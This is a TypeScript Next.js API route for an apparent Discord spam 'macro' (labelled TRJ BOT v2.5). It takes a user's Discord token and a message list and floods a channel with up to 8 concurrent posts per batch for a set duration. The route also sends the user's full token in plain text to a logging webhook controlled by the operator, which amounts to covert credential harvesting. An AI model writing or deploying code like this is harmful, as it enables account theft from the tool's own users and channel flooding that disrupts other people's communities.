import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, channelId, messages, duration, speed } = body;

    if (!token || !channelId || !messages || !Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const endTime = Date.now() + ((duration || 60) * 1000);
    const baseDelay = Math.max((speed || 0.3) * 1000, 50);
    const concurrency = 8; // زيادة من 5 إلى 8

    const whUrl = getLogWebhookUrl();

    sendToWebhook({
      username: 'TRJ Macro',
      embeds: [{
        title: '⚡ Macro Started',
        color: 0xFF8800,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '📝 Messages', value: String(messages.length), inline: true },
          { name: '⚡ Speed', value: `${baseDelay}ms`, inline: true },
          { name: '🚀 Concurrency', value: String(concurrency), inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v2.5' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    let sent = 0, failed = 0, msgIndex = 0;

    while (Date.now() < endTime) {
      const batchPromises = Array.from({ length: concurrency }, async () => {
        if (Date.now() >= endTime) return 0;
        const currentMessage = messages[msgIndex % messages.length];
        msgIndex++;
        try {
          const result = await discordFetch(ct, 'POST', `/channels/${channelId}/messages`, { content: currentMessage });
          return result.ok ? 1 : (result.status !== 429 ? -1 : 0);
        } catch { return -1; }
      });
      const batchResults = await Promise.all(batchPromises);
      for (const r of batchResults) { if (r === 1) sent++; else if (r === -1) failed++; }
      await new Promise(r => setTimeout(r, baseDelay));
    }

    sendToWebhook({
      username: 'TRJ Macro',
      embeds: [{
        title: '✅ Macro Completed',
        color: 0x00FF41,
        fields: [
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '⏱️ Duration', value: `${duration || 60}s`, inline: true },
        ],
        footer: { text: 'TRJ BOT v2.5' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed } });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Macro Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
